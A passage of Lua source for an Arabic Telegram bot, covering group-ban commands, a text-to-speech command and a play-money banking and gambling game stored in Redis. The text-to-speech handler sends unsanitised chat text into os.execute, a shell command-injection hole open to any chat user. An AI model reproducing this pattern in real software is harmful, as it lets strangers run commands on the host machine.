  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
  return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
  end
  local list = Redis:smembers(darket.."List:Manager:inline3am")
  text = "٠ قائمه الردود الانلاين \n– – – – – – – –\n"
  for k,v in pairs(list) do
  if Redis:get(darket.."Add:Rd:Manager:Gif:inline3am"..v) then
  db = "متحركه ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Vico:inline3am"..v) then
  db = "بصمه ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Stekrs:inline3am"..v) then
  db = "ملصق ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Text:inline3am"..v) then
  db = "رساله ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Photo:inline3am"..v) then
  db = "صوره ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Video:inline3am"..v) then
  db = "فيديو ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:File:inline3am"..v) then
  db = "ملف ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Audio:inline3am"..v) then
  db = "اغنيه ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:video_note:inline3am"..v) then
  db = "بصمه فيديو ٠"
  end
  text = text..""..k.." ٠ {"..v.."} ٠ {"..db.."}\n"
  end
  if #list == 0 then
  text = "٠ عذرا لا يوجد ردود انلاين عامه"
  end
  return send(msg_chat_id,msg_id,"["..text.."]","md",true)  
  end
------بحث
if text and text:match("^حظر كروب (.*)$") then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local txx = text:match("^حظر كروب (.*)$")
if txx:match("^-100(%d+)$") then
Redis:sadd(darket..'ban:online',txx)
send(msg_chat_id,msg_id,'\n٠ تم حظر الكروب من البوت ',"md",true)  
else
send(msg_chat_id,msg_id,'\n٠ اكتب ايدي المجموعه بشكل صحيح ',"md",true)  
end
end
if text and text:match("^الغاء حظر كروب (.*)$") then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local txx = text:match("^الغاء حظر كروب (.*)$")
if txx:match("^-100(%d+)$") then
Redis:srem(darket..'ban:online',txx)
send(msg_chat_id,msg_id,'\n٠ تم الغاء حظر الكروب من البوت ',"md",true)  
else
send(msg_chat_id,msg_id,'\n٠ اكتب ايدي المجموعه بشكل صحيح ',"md",true)  
end
end
----بنك
if text then
if text:match("^انطق (.*)$") or text:match("^انطقي (.*)$") then
local inoi = text:match("^انطق (.*)$") or text:match("^انطقي (.*)$")
local intk = inoi:gsub(" ","-")
if intk:match("%a") then
lan = "en"
else
lan = "ar"
end
local rand = math.random(1,999)
os.execute("gtts-cli "..intk.." -l '"..lan.."' -o 'intk"..rand..".mp3'")
LuaTele.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@R125R")
sleep(1)
os.remove("intk"..rand..".mp3")
end
end
--------بدايه البنك 
if text == 'انشاء حساب بنكي' or text == 'انشاء حساب البنكي' or text =='انشاء الحساب بنكي' or text =='انشاء الحساب البنكي' then
creditcc = tonumber(math.random(500000000,5999999999999))
creditvi = tonumber(math.random(40000000000,4999999999999))
creditex = tonumber(math.random(6000000000,69999999999999))
balas = 10
if Redis:sismember(darket.."booob",msg.sender.user_id) then
return send(msg.chat_id,msg.id, "•  لديك حساب بنكي مسبقاً\n\n•  لعرض معلومات حسابك اكتب\n⇠ `حسابي`","md",true)
end
Redis:setex(darket.."booobb" .. msg.chat_id .. ":" .. msg.sender.user_id,60, true)
send(msg.chat_id,msg.id,[[
– عشان تسوي حساب لازم تختار نوع البطاقة

⇠ `ماستر`
⇠ `فيزا`
⇠ `اكسبرس`
⇠ `داركت`

- اضغط للنسخ

– مدة الطلب دقيقة واحدة ويطردك الموظف .
]],"md",true)  
return false
end
if Redis:get(darket.."booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) then
if text == "ماستر" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set(darket.."bobna"..msg.sender.user_id,news)
Redis:set(darket.."boob"..msg.sender.user_id,balas)
Redis:set(darket.."boobb"..msg.sender.user_id,creditcc)
Redis:set(darket.."bbobb"..msg.sender.user_id,text)
Redis:set(darket.."boballname"..creditcc,news)
Redis:set(darket.."boballbalc"..creditcc,balas)
Redis:set(darket.."boballcc"..creditcc,creditcc)
Redis:set(darket.."boballban"..creditcc,text)
Redis:set(darket.."boballid"..creditcc,banid)
Redis:sadd(darket.."booob",msg.sender.user_id)
Redis:del(darket.."booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
send(msg.chat_id,msg.id, "\n• وسوينا لك حساب في بنك داركت 🏦\n• وشحنالك 10 جنيه 💵 هدية\n\n•  رقم حسابك ↢ ( `"..creditcc.."` )\n•  نوع البطاقة ↢ ( ماستر 💳 )\n•  فلوسك ↢ ( 10 جنيه 💵 )  ","md",true)  
end 
if text == "فيزا" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set(darket.."bobna"..msg.sender.user_id,news)
Redis:set(darket.."boob"..msg.sender.user_id,balas)
Redis:set(darket.."boobb"..msg.sender.user_id,creditvi)
Redis:set(darket.."bbobb"..msg.sender.user_id,text)
Redis:set(darket.."boballname"..creditvi,news)
Redis:set(darket.."boballbalc"..creditvi,balas)
Redis:set(darket.."boballcc"..creditvi,creditvi)
Redis:set(darket.."boballban"..creditvi,text)
Redis:set(darket.."boballid"..creditvi,banid)
Redis:sadd(darket.."booob",msg.sender.user_id)
Redis:del(darket.."booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
send(msg.chat_id,msg.id, "\n• وسوينا لك حساب في بنك داركت 🏦\n• وشحنالك 10 جنيه 💵 هدية\n\n•  رقم حسابك ↢ ( `"..creditvi.."` )\n•  نوع البطاقة ↢ ( فيزا 💳 )\n•  فلوسك ↢ ( 10 جنيه 💵 )  ","md",true)   
end 
if text == "داركت" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set(darket.."bobna"..msg.sender.user_id,news)
Redis:set(darket.."boob"..msg.sender.user_id,balas)
Redis:set(darket.."boobb"..msg.sender.user_id,creditvi)
Redis:set(darket.."bbobb"..msg.sender.user_id,text)
Redis:set(darket.."boballname"..creditvi,news)
Redis:set(darket.."boballbalc"..creditvi,balas)
Redis:set(darket.."boballcc"..creditvi,creditvi)
Redis:set(darket.."boballban"..creditvi,text)
Redis:set(darket.."boballid"..creditvi,banid)
Redis:sadd(darket.."booob",msg.sender.user_id)
Redis:del(darket.."booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
send(msg.chat_id,msg.id, "\n• وسوينا لك حساب في بنك داركت 🏦\n• وشحنالك 10 جنيه 💵 هدية\n\n•  رقم حسابك ↢ ( `"..creditvi.."` )\n•  نوع البطاقة ↢ ( داركت 💳 )\n•  فلوسك ↢ ( 10 جنيه 💵 )  ","md",true)   
end 
if text == "اكسبرس" then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = msg.sender.user_id
Redis:set(darket.."bobna"..msg.sender.user_id,news)
Redis:set(darket.."boob"..msg.sender.user_id,balas)
Redis:set(darket.."boobb"..msg.sender.user_id,creditex)
Redis:set(darket.."bbobb"..msg.sender.user_id,text)
Redis:set(darket.."boballname"..creditex,news)
Redis:set(darket.."boballbalc"..creditex,balas)
Redis:set(darket.."boballcc"..creditex,creditex)
Redis:set(darket.."boballban"..creditex,text)
Redis:set(darket.."boballid"..creditex,banid)
Redis:sadd(darket.."booob",msg.sender.user_id)
Redis:del(darket.."booobb" .. msg.chat_id .. ":" .. msg.sender.user_id) 
send(msg.chat_id,msg.id, "\n• وسوينا لك حساب في بنك داركت 🏦\n• وشحنالك 10 جنيه 💵 هدية\n\n•  رقم حسابك ↢ ( `"..creditex.."` )\n•  نوع البطاقة ↢ ( اكسبرس 💳 )\n•  فلوسك ↢ ( 10 جنيه 💵 )  ","md",true)   
end 
end
if text == "البنك" then
local txx = [[
اوامر لعبه البنك :
- انشاء حساب بنكي 
- مسح حسابي
- فلوسي ، حسابي 
- تحويل + المبلغ (بعدها يطلب رقم الحساب)
- ( استثمار ، حظ ، مضاربه ) + المبلغ 
- راتبي ، راتب
- بقشيش 
- هجوم + المبلغ
- زرف (بالرد)
- اضف فلوس + المبلغ (بالرد) *للمطور الاساسي فقط*

]]
send(msg.chat_id,msg.id,txx,"md")
end
if text == 'مسح حساب بنكي' or text == 'مسح حساب البنكي' or text =='مسح الحساب بنكي' or text =='مسح الحساب البنكي' or text == "مسح حسابي البنكي" or text == "مسح حسابي" then
if Redis:sismember(darket.."booob",msg.sender.user_id) then
Redis:srem(darket.."booob", msg.sender.user_id)
Redis:del(darket.."boob"..msg.sender.user_id)
Redis:del(darket.."boobb"..msg.sender.user_id)
Redis:del(darket.."zrfff"..msg.sender.user_id)
Redis:srem(darket.."zrfffid", msg.sender.user_id)
send(msg.chat_id,msg.id, "•  مسحت حسابك البنكي 🏦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'تصفير النتائج' or text == 'مسح لعبه البنك' then
if msg.ControllerBot then
Redis:del(darket.."booob")
Redis:del(darket.."boob")
Redis:del(darket.."boobb")
Redis:del(darket.."zrfff")
Redis:del(darket.."zrfffid")
send(msg.chat_id,msg.id, "•  مسحت لعبه البنك 🏦","md",true)
end
end

if text == 'فلوسي' or text == 'فلوس' and tonumber(msg.reply_to_message_id) == 0 then
if Redis:sismember(darket.."booob",msg.sender.user_id) then
ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
if tonumber(ballancee) < 1 then
return send(msg.chat_id,msg.id, "•  ماعندك فلوس ارسل الالعاب وابدأ بجمع الفلوس \n✦","md",true)
end
send(msg.chat_id,msg.id, "•  فلوسك "..ballancee.." جنيه 💵","md",true)
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'فلوسه' or text == 'فلوس' and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*•  داركت ماعنده حساب بالبنك 🤣*","md",true)  
return false
end
if Redis:sismember(darket.."booob",Remsg.sender.user_id) then
ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
send(msg.chat_id,msg.id, "•  فلوسه "..ballanceed.." جنيه 💵","md",true)
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي ","md",true)
end
end

if text == 'حسابي' or text == 'حسابي البنكي' or text == 'رقم حسابي' then
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember(darket.."booob",msg.sender.user_id) then
cccc = Redis:get(darket.."boobb"..msg.sender.user_id)
uuuu = Redis:get(darket.."bbobb"..msg.sender.user_id)
pppp = Redis:get(darket.."zrfff"..msg.sender.user_id) or 0
ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
send(msg.chat_id,msg.id, "•  الاسم ↢ "..news.."\n•  الحساب ↢ `"..cccc.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..uuuu.." )\n•  الرصيد ↢ ( "..ballancee.." جنيه 💵 )\n•  الزرف ( "..pppp.." جنيه 💵 )\n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'مسح حسابه' and tonumber(msg.reply_to_message_id) ~= 0 then
if msg.ControllerBot then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*•  داركت ماعنده حساب بالبنك 🤣*","md",true)  
return false
end
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember(darket.."booob",Remsg.sender.user_id) then
ccccc = Redis:get(darket.."boobb"..Remsg.sender.user_id)
uuuuu = Redis:get(darket.."bbobb"..Remsg.sender.user_id)
ppppp = Redis:get(darket.."zrfff"..Remsg.sender.user_id) or 0
ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
Redis:srem(darket.."booob", Remsg.sender.user_id)
Redis:del(darket.."boob"..Remsg.sender.user_id)
Redis:del(darket.."boobb"..Remsg.sender.user_id)
Redis:del(darket.."zrfff"..Remsg.sender.user_id)
Redis:srem(darket.."zrfffid", Remsg.sender.user_id)
send(msg.chat_id,msg.id, "•  الاسم ↢ "..news.."\n•  الحساب ↢ `"..ccccc.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..uuuuu.." )\n•  الرصيد ↢ ( "..ballanceed.." جنيه 💵 )\n•  الزرف ↢ ( "..ppppp.." جنيه 💵 )\n•  مسكين مسحت حسابه \n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي اصلاً ","md",true)
end
end
end

if text == 'حسابه' and tonumber(msg.reply_to_message_id) ~= 0 then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*•  داركت ماعنده حساب بالبنك 🤣*","md",true)  
return false
end
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember(darket.."booob",Remsg.sender.user_id) then
ccccc = Redis:get(darket.."boobb"..Remsg.sender.user_id)
uuuuu = Redis:get(darket.."bbobb"..Remsg.sender.user_id)
ppppp = Redis:get(darket.."zrfff"..Remsg.sender.user_id) or 0
ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
send(msg.chat_id,msg.id, "•  الاسم ↢ "..news.."\n•  الحساب ↢ `"..ccccc.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..uuuuu.." )\n•  الرصيد ↢ ( "..ballanceed.." جنيه 💵 )\n•  الزرف ↢ ( "..ppppp.." جنيه 💵 )\n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي ","md",true)
end
end

if text and text:match('^مسح حساب (.*)$') or text and text:match('^مسح حسابه (.*)$') then
if msg.ControllerBot then
local UserName = text:match('^مسح حساب (.*)$') or text:match('^مسح حسابه (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = tonumber(coniss)
local ban = LuaTele.getUser(coniss)
if ban.first_name then
news = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
news = " لا يوجد "
end
if Redis:sismember(darket.."booob",coniss) then
ccccc = Redis:get(darket.."boobb"..coniss)
uuuuu = Redis:get(darket.."bbobb"..coniss)
ppppp = Redis:get(darket.."zrfff"..coniss) or 0
ballanceed = Redis:get(darket.."boob"..coniss) or 0
Redis:srem(darket.."booob", coniss)
Redis:del(darket.."boob"..coniss)
Redis:del(darket.."boobb"..coniss)
Redis:del(darket.."zrfff"..coniss)
Redis:srem(darket.."zrfffid", coniss)
send(msg.chat_id,msg.id, "•  الاسم ↢ "..news.."\n•  الحساب ↢ `"..ccccc.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..uuuuu.." )\n•  الرصيد ↢ ( "..ballanceed.." جنيه 💵 )\n•  الزرف ↢ ( "..ppppp.." جنيه 💵 )\n•  مسكين مسحت حسابه \n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي اصلاً ","md",true)
end
end
end

if text and text:match('^حساب (.*)$') or text and text:match('^حسابه (.*)$') then
local UserName = text:match('^حساب (.*)$') or text:match('^حسابه (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = tonumber(coniss)
if Redis:get(darket.."boballcc"..coniss) then
local yty = Redis:get(darket.."boballname"..coniss)
local dfhb = Redis:get(darket.."boballbalc"..coniss)
local fsvhh = Redis:get(darket.."boballban"..coniss)
send(msg.chat_id,msg.id, "•  الاسم ↢ "..yty.."\n•  الحساب ↢ `"..coniss.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..fsvhh.." )\n•  الرصيد ↢ ( "..dfhb.." جنيه 💵 )\n✦","md",true)
else
send(msg.chat_id,msg.id, "•  مافيه حساب بنكي كذا","md",true)
end
end

if text == 'مضاربه' then
send(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`مضاربه` المبلغ","md",true)
end

if text and text:match('^مضاربه (.*)$') then
local UserName = text:match('^مضاربه (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = tonumber(coniss)
if Redis:sismember(darket.."booob",msg.sender.user_id) then
if Redis:get(darket.."iiooooo" .. msg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."iiooooo" .. msg.sender.user_id))
return send(msg.chat_id,msg.id,"•  مايمديك تضارب الحين\n•  تعال بعد ( "..time_ex.." )","md",true)
end
ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
if tonumber(coniss) < 99 then
return send(msg.chat_id,msg.id, "•  الحد الادنى المسموح هو 100 جنيه 💵\n✦","md",true)
end
if tonumber(ballancee) < tonumber(coniss) then
return send(msg.chat_id,msg.id, "•  فلوسك ماتكفي \n✦","md",true)
end
local modarba = {"0", "1", "2", "3", "4",}
local Descriptioontt = modarba[math.random(#modarba)]
local modarbaa = math.random(1,90);
if Descriptioontt == "1" or Descriptioontt == "3" then
ballanceekku = coniss / 100 * modarbaa
ballanceekkku = ballancee - ballanceekku
Redis:set(darket.."boob"..msg.sender.user_id , math.floor(ballanceekkku))
Redis:setex(darket.."iiooooo" .. msg.sender.user_id,1200, true)
send(msg.chat_id,msg.id, "•  مضاربة فاشلة 📉\n•  نسبة الخسارة ↢ "..modarbaa.."%\n•  المبلغ الذي خسرته ↢ ( "..ballanceekku.." جنيه 💵 )\n•  فلوسك صارت ↢ ( "..ballanceekkku.." جنيه 💵 )\n✦","md",true)
elseif Descriptioontt == "2" or Descriptioontt == "4" then
ballanceekku = coniss / 100 * modarbaa
ballanceekkku = ballancee + ballanceekku
Redis:set(darket.."boob"..msg.sender.user_id , math.floor(ballanceekkku))
Redis:setex(darket.."iiooooo" .. msg.sender.user_id,1200, true)
send(msg.chat_id,msg.id, "•  مضاربة ناجحة 📈\n•  نسبة الربح ↢ "..modarbaa.."%\n•  المبلغ الذي ربحته ↢ ( "..ballanceekku.." جنيه 💵 )\n•  فلوسك صارت ↢ ( "..ballanceekkku.." جنيه 💵 )\n✦","md",true)
else
Redis:setex(darket.."iiooooo" .. msg.sender.user_id,1200, true)
send(msg.chat_id,msg.id, "•  تأخرت اليوم والبنك مسكر ارجع بعدين \n✦","md",true)
end
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'استثمار' then
send(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`استثمار` المبلغ","md",true)
end

if text and text:match('^استثمار (.*)$') then
local UserName = text:match('^استثمار (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = tonumber(coniss)
if Redis:sismember(darket.."booob",msg.sender.user_id) then
if Redis:get(darket.."iioooo" .. msg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."iioooo" .. msg.sender.user_id))
return send(msg.chat_id,msg.id,"•  مايمديك تستثمر الحين\n•  تعال بعد ( "..time_ex.." )","md",true)
end
ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
if tonumber(coniss) < 99 then
return send(msg.chat_id,msg.id, "•  الحد الادنى المسموح هو 100 جنيه 💵\n✦","md",true)
end
if tonumber(ballancee) < tonumber(coniss) then
return send(msg.chat_id,msg.id, "•  فلوسك ماتكفي \n✦","md",true)
end
local hadddd = math.random(0,17);
ballanceekk = coniss / 100 * hadddd
ballanceekkk = ballancee + ballanceekk
Redis:incrby(darket.."boob"..msg.sender.user_id , math.floor(ballanceekk))
Redis:setex(darket.."iioooo" .. msg.sender.user_id,1200, true)
send(msg.chat_id,msg.id, "•  استثمار ناجح 💰\n•  نسبة الربح ↢ "..hadddd.."%\n•  مبلغ الربح ↢ ( "..ballanceekk.." جنيه 💵 )\n•  فلوسك صارت ↢ ( "..ballanceekkk.." جنيه 💵 )\n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'حظ' then
send(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`حظ` المبلغ","md",true)
end

if text and text:match('^حظ (.*)$') then
local UserName = text:match('^حظ (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if Redis:sismember(darket.."booob",msg.sender.user_id) then
if Redis:get(darket.."iiooo" .. msg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."iiooo" .. msg.sender.user_id)) 
return send(msg.chat_id,msg.id,"•  مايمديك تلعب لعبة الحظ الحين\n•  تعال بعد ( "..time_ex.." )","md",true)
end
ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
if tonumber(ballancee) < tonumber(coniss) then
return send(msg.chat_id,msg.id, "•  فلوسك ماتكفي \n✦","md",true)
end
local daddd = {"1", "2", "3", "4",}
local haddd = daddd[math.random(#daddd)]
if haddd == "1" or haddd == "3" then
local ballanceek = ballancee + coniss
Redis:incrby(darket.."boob"..msg.sender.user_id , coniss)
Redis:setex(darket.."iiooo" .. msg.sender.user_id,1200, true)
send(msg.chat_id,msg.id, "•  مبروك فزت بالحظ 🎉\n•  فلوسك قبل ↢ ( "..ballancee.." جنيه 💵 )\n•  فلوسك الحين ↢ ( "..ballanceek.." جنيه 💵 )\n✦","md",true)
else
local ballanceekk = ballancee - coniss
Redis:decrby(darket.."boob"..msg.sender.user_id , coniss)
Redis:setex(darket.."iiooo" .. msg.sender.user_id,1200, true)
send(msg.chat_id,msg.id, "•  للاسف خسرت بالحظ 😬\n•  فلوسك قبل ↢ ( "..ballancee.." جنيه 💵 )\n•  فلوسك الحين ↢ ( "..ballanceekk.." جنيه 💵 )\n✦","md",true)
end
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end

if text == 'تحويل' then
send(msg.chat_id,msg.id, "استعمل الامر كذا :\n\n`تحويل` المبلغ","md",true)
end

if text and text:match('^تحويل (.*)$') then
local UserName = text:match('^تحويل (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if not Redis:sismember(darket.."booob",msg.sender.user_id) then
return send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ","md",true)
end
if tonumber(coniss) < 100 then
return send(msg.chat_id,msg.id, "•  الحد الادنى المسموح به هو 100 جنيه \n✦","md",true)
end
ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
if tonumber(ballancee) < 100 then
return send(msg.chat_id,msg.id, "•  فلوسك ماتكفي \n✦","md",true)
end

if tonumber(coniss) > tonumber(ballancee) then
return send(msg.chat_id,msg.id, "•  فلوسك ماتكفي\n✦","md",true)
end

Redis:set(darket.."transn"..msg.sender.user_id,coniss)
Redis:setex(darket.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id,60, true)
send(msg.chat_id,msg.id,[[
•  ارسل الحين رقم الحساب البنكي الي تبي تحول له

– معاك دقيقة وحدة والغي طلب التحويل .
✦
]],"md",true)  
return false
end
if Redis:get(darket.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) then
cccc = Redis:get(darket.."boobb"..msg.sender.user_id)
uuuu = Redis:get(darket.."bbobb"..msg.sender.user_id)
if text ~= text:match('^(%d+)$') then
Redis:del(darket.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del(darket.."transn" .. msg.sender.user_id)
return send(msg.chat_id,msg.id,"•  ارسل رقم حساب بنكي ","md",true)
end
if text == cccc then
Redis:del(darket.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del(darket.."transn" .. msg.sender.user_id)
return send(msg.chat_id,msg.id,"•  مايمديك تحول لنفسك ","md",true)
end
if Redis:get(darket.."boballcc"..text) then
local UserNamey = Redis:get(darket.."transn"..msg.sender.user_id)
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
news = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
news = " لا يوجد "
end
local fsvhhh = Redis:get(darket.."boballid"..text)
local bann = LuaTele.getUser(fsvhhh)
if bann.first_name then
newss = "["..bann.first_name.."](tg://user?id="..bann.id..")"
else
newss = " لا يوجد "
end
local fsvhh = Redis:get(darket.."boballban"..text)
UserNameyr = UserNamey / 10
UserNameyy = UserNamey - UserNameyr
Redis:decrby(darket.."boob"..msg.sender.user_id , UserNamey)
Redis:incrby(darket.."boob"..fsvhhh , math.floor(UserNameyy))
send(msg.chat_id,msg.id, "حوالة صادرة من بنك داركت\n\nالمرسل : "..news.."\nالحساب رقم : `"..cccc.."`\nنوع البطاقة : "..uuuu.."\nالمستلم : "..newss.."\nالحساب رقم : `"..text.."`\nنوع البطاقة : "..fsvhh.."\nخصمت 10% رسوم تحويل\nالمبلغ : "..UserNameyy.." جنيه 💵","md",true)
send(fsvhhh,0, "حوالة واردة من بنك داركت\n\nالمرسل : "..news.."\nالحساب رقم : `"..cccc.."`\nنوع البطاقة : "..uuuu.."\nالمبلغ : "..UserNameyy.." جنيه 💵","md",true)
Redis:del(darket.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del(darket.."transn" .. msg.sender.user_id)
else
send(msg.chat_id,msg.id, "•  مافيه حساب بنكي كذا","md",true)
Redis:del(darket.."trans" .. msg.chat_id .. ":" .. msg.sender.user_id) 
Redis:del(darket.."transn" .. msg.sender.user_id)
end
end

if text and text:match("^اضف فلوس (.*)$") and msg.reply_to_message_id ~= 0 then
local UserName = text:match('^اضف فلوس (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if msg.ControllerBot then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
